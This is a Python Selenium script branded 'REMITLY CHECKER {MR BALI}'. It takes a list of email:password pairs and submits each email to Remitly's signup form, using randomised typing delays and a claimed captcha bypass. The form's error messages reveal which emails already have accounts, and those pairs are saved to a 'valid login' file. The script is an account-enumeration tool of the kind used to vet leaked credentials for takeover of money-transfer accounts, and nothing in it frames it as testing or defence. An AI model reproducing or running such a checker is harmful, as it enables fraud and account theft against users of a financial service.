from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
import random
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
options = Options()
options.binary_location = r"C:/Program Files/Mozilla Firefox/firefox.exe"
options.add_argument("start-maximized")
options.add_argument("--disable-extensions")
# driver = webdriver.Firefox(options=options, executable_path="C:/Users/Administrator/Desktop/geckodriver.exe")
time.sleep(2)

#pyinstaller --add-data "C:\Users\Administrator\AppData\Local\Programs\Python\Python39\Lib\site-packages\pyfiglet;./pyfiglet" western.py

print("                                           REMITLY CHECKER {MR BALI}           ")
print("\n")
print(   '                                                    Version 1.0')
print('Features - ')
time.sleep(1)
print('------------------------------------------------------------------------------------------------------------------------')
print("""
1. Checks for valid remitly emails
2. Google Captcha bypasses automatically
3. Works on slow internet too
4. Saves Valid/Rejected Emails to text file
5. It is fully automate and doesnot need any code to start
6. If your checker stops it doesnot start from beginning
""")
key = "12345677aa"

timelist = [0.25,0.45,0.1]
time.sleep(1)
print('------------------------------------------------------------------------------------------------------------------------')
print('                                                 CHECKER IS RUNNING......')

newlist = []
with open("remitlyemails.txt", 'r') as input_emails:
    lines = input_emails.readlines()
for i in lines:
    newlist2 = i.strip()
    newlist2 = newlist2.split(':')
    newlist3 = newlist2[1]
    newlist.append(newlist2)


print('started')

for i in newlist:
    driver = webdriver.Firefox(options=options, executable_path="C:/Users/Administrator/Desktop/remitly/geckodriver.exe")
    #class="col-xs-10 wu-captcha-container wu-color-linear-gradient"
    driver.get('https://www.remitly.com/us/en')
    joinclick = driver.find_element_by_link_text("Join Now")
    time.sleep(0.5)
    joinclick.click()
    time.sleep(0.5)
    select = driver.find_element_by_class_name("f1fjkq2h")
    select.click()
    time.sleep(2)
    # inputthe = driver.find_element_by_class_name("f1o5t4uv")
    action = ActionChains(driver)
    
    print('\n')
    action.send_keys('india').perform()
    add = driver.find_element_by_xpath("//div[@class='f1xmyxlx']//span")
    # add = driver.find_element_by_class_name("md_countryName_fdxiah8")
    time.sleep(0.5)
    add.click()
    time.sleep(0.5)
    email = driver.find_element_by_name("email_address")
    time.sleep(0.1)

    splitemails = i[0]
    passwordofremitly = i[1]
    time.sleep(1)
    for i in splitemails:
        email.send_keys(i)
        time.sleep(random.choice(timelist))
    time.sleep(1)

    password = driver.find_element_by_name('password')
    time.sleep(0.5)
    for i in key:
        password.send_keys(i)
        time.sleep(random.choice(timelist))
    time.sleep(0.5)
    
    password2 = driver.find_element_by_name('conf_password')
    time.sleep(0.5)
    for i in key:
        password2.send_keys(i)
        time.sleep(random.choice(timelist))
    
    time.sleep(0.5)
    send = driver.find_element_by_class_name("fem9zbl")
    time.sleep(0.5)
    send.click()
    time.sleep(2)
    try:
        result2 = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, "input-supertext")))
        # result2 = driver.find_element_by_class_name("input-supertext")
        time.sleep(0.5)
    # loginchecker = driver.find_element_by_class_name("")
    # if "Send money" in loginchecker:
        # pass
        if "Looks like you already have an profile associated with this email address. Would you like to sign in instead?" in result2.text:
            print('This email is valid login with this email address and password')
            remitlyvalidlogin = open('remitlyvalidlogin.txt', 'a')
            remitlyvalidlogin.write(splitemails+':'+passwordofremitly+'\n')
            driver.close()
            remitlyvalidlogin.close()
    except:
        # result2 = driver.find_element_by_class_name("hidden-md-down")
        result2 = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, "hidden-md-down")))
        print('this '+str(result2.text))
        if "Send money" in result2.text:
            print('This email is not valid')
            remitlyinvalid = open('remitlyinvalid.txt','a')
            remitlyinvalid.write(splitemails+'\n')
            
            driver.close()

            remitlyinvalid.close()
